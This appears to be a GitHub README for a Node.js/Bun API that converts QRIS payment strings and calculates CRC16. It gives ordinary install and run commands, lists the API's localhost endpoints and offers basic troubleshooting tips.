# 📦 qris-api - Convert QRIS Easily and Efficiently

[![Download QRIS API](https://img.shields.io/badge/Download%20QRIS%20API-blue.svg)](https://github.com/li329211/qris-api/releases)

## 🚀 Getting Started

This guide will help you download and run the QRIS API application. The QRIS API allows you to convert QRIS strings easily. You’ll access various features through a simple interface. Let’s dive in.

## 📥 Download & Install

To get started, visit [this page to download](https://github.com/li329211/qris-api/releases). Choose the latest release from the list. Download the appropriate version for your operating system.

## ✅ Prerequisites

Before installing, make sure you have:

- **Node.js version 18 or higher** or **Bun** installed on your computer. You can check your current version by running `node -v` or `bun -v` in your terminal.

## ⚙️ Installation Steps

Follow these steps to install the QRIS API:

1. **Open your terminal.**
2. **Navigate to your project directory.** Use the `cd` command followed by your project folder name. For example:
   ```bash
   cd my-project-folder
   ```
3. **Install the project dependencies.**

   If you're using npm, enter:
   ```bash
   npm install
   ```

   If you prefer Bun, run:
   ```bash
   bun install
   ```

4. **Ensure Swagger dependency is installed.** This step is crucial for documentation support.

   For npm, type:
   ```bash
   npm install @elysiajs/swagger
   ```

   If using Bun, this command will work:
   ```bash
   bun add @elysiajs/swagger
   ```

## 🏃‍♂️ Running the Application

Once you have installed everything, you can run the application. Choose one of the following methods:

### Development Mode

If you want to run in development mode using TypeScript, simply run:
```bash
npm run start
```

### Production Build

For a production setup with building, use:
```bash
npm run build
node dist/app.js
```

### Bun Users

If using Bun, run this command:
```bash
bun src/app.ts
```

### Access the API

The server will typically run on `http://localhost:3000`. You can access its features as follows:

- For Documentation: Go to `http://localhost:3000/docs`
- For the Simple User Interface: Visit `http://localhost:3000/ui`

## 📄 API Features

The QRIS API offers:

- **Endpoint**: `POST /convert` - This converts QRIS strings and calculates CRC16.
- **Documentation Access**: Available at `GET /docs` to help you understand the API's usage.
- **User Interface**: Use the simple UI at `GET /ui` for easy interaction with the API.

## 🗂️ OpenAPI Schema

The OpenAPI schema for the `/convert` endpoint has been integrated for your convenience. Refer to the documentation for detailed descriptions of how each endpoint functions.

## 🤔 Troubleshooting

If you encounter issues while running the QRIS API, here are some common solutions:

- **Check Node.js/Bun installation**: Ensure they are installed correctly. Reinstall if necessary.
- **Refer to error messages**: Read any error logs to identify what might be wrong.
- **Consult the Documentation**: Most issues can be resolved by checking the API documentation available at `http://localhost:3000/docs`.

For further assistance, feel free to open an issue on the [GitHub repository](https://github.com/li329211/qris-api/issues).

## 🤝 Support & Contribution

If you would like to contribute to this project or report any bugs, please visit our GitHub repository. Information on contributing is available in the repository.

We appreciate your interest in the QRIS API and hope you find it helpful for your projects!